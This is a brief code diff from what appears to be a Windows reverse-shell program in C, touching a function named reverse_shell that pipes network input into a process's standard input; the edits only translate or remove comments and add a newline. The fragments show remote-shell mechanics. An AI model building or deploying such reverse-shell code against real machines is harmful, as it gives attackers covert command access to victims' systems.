@@ -331,10 +331,10 @@ void reverse_shell(const char* ip, int port) {
 			WriteFile(hStdInWrite, buffer, len + 1, &bytesWritten, NULL);
 		}
 		else if (len == 0) {
-			break; // connexion fermée
+			break; // close connexion
 		}
 
-		Sleep(50); // éviter CPU à 100%
+		Sleep(50);
 	}
 
 	CloseHandle(hStdInWrite);
@@ -856,3 +856,4 @@ int main() {
 
 
 }
+
